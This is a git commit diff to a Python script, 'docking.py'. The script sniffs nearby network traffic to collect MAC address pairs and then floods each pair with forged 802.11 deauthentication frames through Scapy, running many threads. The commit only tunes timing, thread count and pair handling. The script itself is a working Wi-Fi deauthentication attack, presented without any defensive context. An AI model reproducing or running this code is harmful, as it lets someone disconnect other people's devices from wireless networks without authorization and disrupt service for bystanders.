3ac38b1549a6bf4c18ea69dcfa097312575aceb6
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-05-27 17:07:45 +0900

    Update docking.py

--- docking.py
+++ docking.py
@@ -4,7 +4,7 @@ import concurrent.futures
 def bad(device, wifi):
     interface = "en0"
     packet = RadioTap() / Dot11(addr1=device, addr2=wifi, addr3=wifi) / Dot11Deauth()
-    sendp(packet, iface=interface, count=100, inter=0.001)
+    sendp(packet, iface=interface, count=100, inter=0.1)
     print("deauth: wifi:{}, device:{}".format(wifi, device))
 
 def packet_handler(packet):
@@ -13,12 +13,13 @@ def packet_handler(packet):
         src_mac = packet[Ether].src
         dst_mac = packet[Ether].dst
         data = packet[Ether].payload
-        packet_list.append((src_mac, dst_mac))
+        packet_list.add((src_mac, dst_mac))
+        packet_list.add((dst_mac, src_mac))
 
-packet_list = []
+packet_list = set()
 sniff(iface="en0", prn=packet_handler, filter="", timeout=60)
 
-with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
     tasks = [executor.submit(bad, pack[0], pack[1]) for pack in packet_list]
     tasks.extend([executor.submit(bad, pack[1], pack[0]) for pack in packet_list])
     concurrent.futures.wait(tasks)
